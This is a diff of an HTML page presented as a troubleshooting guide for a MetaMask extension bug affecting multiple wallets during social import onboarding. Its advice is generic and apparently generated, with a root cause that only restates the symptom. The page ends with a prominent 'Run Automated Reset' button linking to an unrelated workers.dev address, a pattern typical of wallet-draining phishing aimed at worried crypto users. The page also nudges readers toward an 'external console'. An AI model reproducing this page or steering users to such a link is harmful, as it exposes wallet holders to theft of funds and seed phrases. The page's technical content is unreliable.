@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0f111a;
+        font-family: sans-serif;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -39,44 +39,45 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social Import Onboarding</h1>
+<h1>Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an issue with the Metamask extension where multiple wallets are not syncing or discovering properly during the social import onboarding process, resulting in failed wallet imports and inconsistent account management.</li>
+<li>Users experience issues with multiple wallets during the social import onboarding process, resulting in failed sync/discovery and preventing access to their wallets.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension's wallet discovery and synchronization mechanism, which fails to handle multiple wallets correctly, leading to inconsistencies in the onboarding process.</li>
+<li>The error occurs due to a bug in the Metamask extension, which fails to handle multiple wallets correctly during the social import onboarding process, leading to sync/discovery issues.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Reset the Metamask extension settings to default</li>
-<li>Delete and reinstall the Metamask extension</li>
-<li>Use the following JSON configuration to manually configure the wallet discovery settings:</li>
+<li>Attempt to reset the Metamask extension by deleting local storage: <code>localStorage.clear()</code></li>
+<li>Try to manually configure the wallet settings using the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;wallets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
 <span class="w">    </span><span class="p">{</span>
 <span class="w">      </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wallet1&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x1234567890abcdef&quot;</span>
+<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth&quot;</span>
 <span class="w">    </span><span class="p">},</span>
 <span class="w">    </span><span class="p">{</span>
 <span class="w">      </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;wallet2&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x9876543210fedcba&quot;</span>
+<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...&quot;</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth&quot;</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">]</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console to execute these commands for more flexibility.</p>
-<h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and enabled</li>
-<li>Ethereum wallet(s) set up and configured</li>
-<li>Social import onboarding process initiated</li>
+<li>Use the Metamask debug mode to enable verbose logging and identify the root cause of the issue</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li></ul>
+<p>For the best results, ensure you have:
+* Metamask extension version 10.22.1 or later
+* Google Chrome browser version 103 or later
+* A stable internet connection</p>
+<p>You may want to consider using an external console to further debug the issue.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
